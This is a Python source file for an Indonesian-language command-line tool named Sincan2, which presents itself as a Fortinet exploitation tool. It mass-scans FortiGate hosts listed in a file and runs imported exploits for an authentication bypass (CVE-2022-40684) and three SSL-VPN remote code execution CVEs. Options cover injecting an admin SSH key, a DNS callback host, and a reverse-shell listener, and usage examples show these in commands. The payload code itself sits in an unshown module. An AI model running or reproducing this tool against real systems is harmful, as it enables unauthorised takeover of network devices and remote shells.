#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Sincan2: Fortinet Focused Exploitation Tool
"""
import textwrap
import traceback
import logging
import datetime
import signal
import _exploits
import _updates
from os import name, system, path as os_path
import os, sys
from time import sleep
from random import randint
import argparse, socket
from sys import argv, exit, version_info
from urllib.parse import quote_plus, urlparse
import warnings

try:
    import requests
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

try:
    from urllib3.exceptions import InsecureRequestWarning, ConnectTimeoutError, MaxRetryError, TimeoutError
    from urllib3.util import Timeout
    from urllib3 import PoolManager, ProxyManager, make_headers
except ImportError:
    print(f"\n * Pustaka 'urllib3' tidak ditemukan. Silakan install dengan 'pip install urllib3'.\n")
    exit(1)

logging.captureWarnings(True)

__author__ = "MHL TEAM (Original), Sincan2 (Refactoring)"
__version__ = "7.0.0 (Full Fortinet Auto-Scan)"

# Definisi warna
RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
YELLOW = '\033[1;33m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

# Variabel Global
gl_interrupted = False
gl_args = None
gl_http_pool = None

def print_and_flush(message, same_line=False):
    end_char = '' if same_line else '\n'
    if version_info[0] >= 3:
        print(message, end=end_char, flush=True)
    else:
        sys.stdout.write(message + end_char)
        sys.stdout.flush()

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    ]
    return user_agents[randint(0, len(user_agents) - 1)]

def configure_http_pool():
    global gl_http_pool
    timeout = Timeout(connect=gl_args.timeout, read=gl_args.timeout * 2)
    if gl_args.proxy:
        gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE', retries=False)
    else:
        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE', retries=False)
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)

def handler_interrupt(signum, frame):
    global gl_interrupted
    gl_interrupted = True
    print_and_flush("\nProses dihentikan oleh pengguna...")
    exit(1)

signal.signal(signal.SIGINT, handler_interrupt)

def check_vul(url):
    """Fungsi utama untuk memeriksa semua vektor kerentanan Fortinet."""
    parsed_main_url = urlparse(url)
    if not parsed_main_url.scheme: url = "https" + url # Default ke HTTPS untuk Fortinet
    
    print_and_flush(GREEN + f"\n ** Memeriksa Host: {url} **\n" + ENDC)
    
    fortinet_cves = {
        "FortiGate Auth Bypass (CVE-2022-40684)": _exploits.exploit_cve_2022_40684,
        "FortiGate SSL-VPN RCE (CVE-2022-42475)": _exploits.exploit_cve_2022_42475,
        "FortiGate SSL-VPN RCE (CVE-2023-27997)": _exploits.exploit_cve_2023_27997,
        "FortiGate SSL-VPN RCE (CVE-2024-21762)": _exploits.exploit_cve_2024_21762,
    }
        
    results = {}
    for vector, exploit_func in fortinet_cves.items():
        if gl_interrupted: break
        
        # --- LOGIKA BARU: Cek parameter sebelum menjalankan ---
        if "CVE-2022-40684" in vector and (not gl_args.forti_user or not gl_args.forti_ssh_key):
            print_and_flush(GREEN + f" [*] Memeriksa {vector:<45}" + YELLOW + "  [ DILEWATI (Parameter --forti-user/--forti-ssh-key tidak ada) ]" + ENDC)
            continue
        if "CVE-2024-21762" in vector and not gl_args.callback_host:
            print_and_flush(GREEN + f" [*] Memeriksa {vector:<45}" + YELLOW + "  [ DILEWATI (Parameter --callback-host tidak ada) ]" + ENDC)
            continue
        if ("CVE-2023-27997" in vector or "CVE-2022-42475" in vector) and (not gl_args.reverse_host or not gl_args.reverse_port):
            print_and_flush(GREEN + f" [*] Memeriksa {vector:<45}" + YELLOW + "  [ DILEWATI (Parameter --reverse-host/--reverse-port tidak ada) ]" + ENDC)
            continue
            
        print_and_flush(GREEN + f" [*] Menjalankan {vector:<45}" + ENDC, same_line=True)
        try:
            res = exploit_func(url, gl_args)
            if res.get('status') == 'vulnerable':
                print_and_flush(RED + f"  [ RENTAN ]" + ENDC)
                if 'details' in res: print_and_flush(f"    {YELLOW}└─> {res['details']}{ENDC}")
                results[vector] = 200
            elif res.get('status') == 'error':
                 print_and_flush(RED + f"  [ ERROR ]" + ENDC)
                 if 'details' in res: print_and_flush(f"    {YELLOW}└─> {res['details']}{ENDC}")
                 results[vector] = 505
            else: # 'ok'
                print_and_flush(GREEN + "  [ TIDAK RENTAN ]" + ENDC)
                results[vector] = 404
        except (ConnectTimeoutError, MaxRetryError, TimeoutError, socket.timeout):
            print_and_flush(f"{YELLOW} [ TARGET OFFLINE (Timeout) ]{ENDC}")
            results[vector] = 505
        except Exception as e:
            print_and_flush(f"{RED} [ GAGAL ({type(e).__name__}) ]{ENDC}")
            results[vector] = 505
            
    return results

def banner():
    system('cls' if name == 'nt' else 'clear')
    banner_art = r"""
|  \     /  \|  \  |  \|  \            |        \|        \ /      \ |  \     /  \
| $$\   /  $$| $$  | $$| $$             \$$$$$$$$| $$$$$$$$|  $$$$$$\| $$\   /  $$
| $$$\ /  $$$| $$__| $$| $$               | $$   | $$__    | $$__| $$| $$$\ /  $$$
| $$$$\  $$$$| $$    $$| $$               | $$   | $$  \   | $$    $$| $$$$\  $$$$
| $$\$$ $$ $$| $$$$$$$$| $$               | $$   | $$$$$   | $$$$$$$$| $$\$$ $$ $$
| $$ \$$$| $$| $$  | $$| $$_____          | $$   | $$_____ | $$  | $$| $$ \$$$| $$
| $$  \$ | $$| $$  | $$| $$     \         | $$   | $$     \| $$  | $$| $$  \$ | $$
 \$$      \$$ \$$   \$$ \$$$$$$$$          \$$    \$$$$$$$$ \$$   \$$ \$$      \$$
"""
    print_and_flush(f"{RED1}{banner_art}{YELLOW}")
    print_and_flush(f"                  Sincan2 Exploit Tool v{__version__}")
    print_and_flush(f"                        - by MHL TEAM -{ENDC}\n")

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description=f"Sincan2 v{__version__} - Alat Eksploitasi Khusus Fortinet.",
        epilog=textwrap.dedent('''\
        Contoh Penggunaan:
          - Tes CVE-2022-40684 pada satu target:
            python3 sincan2.py -u https://192.168.1.99 --forti-user admin --forti-ssh-key ~/.ssh/id_rsa.pub

          - Tes semua CVE pada target dari file (parameter yang tidak relevan akan dilewati):
            python3 sincan2.py -f targets.txt -p 10443 --callback-host x.oastify.com --reverse-host 10.0.0.1 --reverse-port 4444
        '''))
    
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-u", "--host", help="Host target tunggal (contoh: https://192.168.1.99)")
    target_group.add_argument("-f", "--file", help="File yang berisi daftar IP/hostname Fortinet")
    parser.add_argument("-p", "--port", type=int, help="Port default untuk host dari file")
    parser.add_argument("--proxy", help="Gunakan proxy HTTP (contoh: http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=15, help="Waktu tunggu koneksi (default: 15)")
    
    forti_group = parser.add_argument_group('Parameter Eksploit Fortinet (Opsional, diisi sesuai kebutuhan)')
    forti_group.add_argument("--forti-user", help="Username untuk CVE-2022-40684")
    forti_group.add_argument("--forti-ssh-key", help="Path ke file public SSH key untuk CVE-2022-40684")
    forti_group.add_argument("--callback-host", help="Callback host (DNS) untuk CVE-2024-21762")
    forti_group.add_argument("--reverse-host", help="IP listener untuk reverse shell")
    forti_group.add_argument("--reverse-port", type=int, help="Port listener untuk reverse shell")

    gl_args = parser.parse_args()
    if gl_args.file and not gl_args.port: parser.error("-p/--port wajib digunakan bersama -f/--file.")

    targets_to_scan = []
    if gl_args.host: targets_to_scan.append(gl_args.host)
    else:
        if not os_path.exists(gl_args.file): print_and_flush(f"{RED}[ERROR] File tidak ditemukan: {gl_args.file}{ENDC}"); exit(1)
        with open(gl_args.file, 'r') as f:
            for line in f:
                ip = line.strip()
                if ip:
                    scheme = "https" # Fortinet umumnya menggunakan HTTPS
                    targets_to_scan.append(f"https://{ip}:{gl_args.port}")

    configure_http_pool(); _exploits.set_http_pool(gl_http_pool)
    print_and_flush(f"\n{BLUE}[INFO] Akan memindai {len(targets_to_scan)} target dengan timeout {gl_args.timeout} detik...{ENDC}")

    for target_url in targets_to_scan:
        if gl_interrupted: print_and_flush(f"\n{RED}[INFO] Pemindaian massal dihentikan.{ENDC}"); break
        scan_results = check_vul(target_url)
        vulnerables = [k for k, v in scan_results.items() if v == 200]
        if not vulnerables: print_and_flush(GREEN + f"\n[+] Selesai untuk {target_url}. Tidak ada kerentanan yang jelas ditemukan." + ENDC)
        else:
            print_and_flush(RED + f"\n[!] Ditemukan potensi kerentanan pada {target_url}: {', '.join(vulnerables)}" + ENDC)
            
    print_and_flush(f"\n{BLUE}[INFO] Semua target telah selesai dipindai.{ENDC}")
